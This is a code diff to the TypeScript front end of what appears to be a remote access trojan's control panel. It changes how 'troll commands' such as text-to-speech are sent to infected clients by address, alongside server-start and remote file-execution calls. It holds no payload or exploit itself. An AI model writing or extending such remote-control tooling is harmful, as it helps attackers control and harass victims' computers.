@@ -1,5 +1,5 @@
 import { invoke } from "@tauri-apps/api/core";
-import { RATClient, RATState, AssemblyInfo } from "../../types";
+import { RATClient, RATState, AssemblyInfo, TrollCommand } from "../../types";
 
 export const startServerCmd = async (port: string): Promise<string> => {
   return invoke("start_server", { port });
@@ -263,16 +263,19 @@ export const executeFile = async (
 
 export const sendTrollCommand = async (
   addr: string | undefined,
-  command: string
+  command: TrollCommand
 ): Promise<void> => {
-  // Check if this is a SpeakText command with text data
-  if (command.startsWith("SpeakText:")) {
-    // Extract the text part after the colon
-    const text = command.substring("SpeakText:".length);
-    // Send the command with the text parameter
-    return invoke("send_troll_command_with_text", { addr, command: "SpeakText", text });
+  console.log("Sending troll command:", command);
+  const cleanCommand = { ...command };
+
+  if (cleanCommand.payload == undefined) {
+    cleanCommand.payload = "null";
   }
-  
-  // For regular commands without parameters
-  return invoke("send_troll_command", { addr, command });
+
+  console.log("Sending troll command:", cleanCommand);
+
+  await invoke("send_troll_command", {
+    addr,
+    command: cleanCommand,
+  });
 };
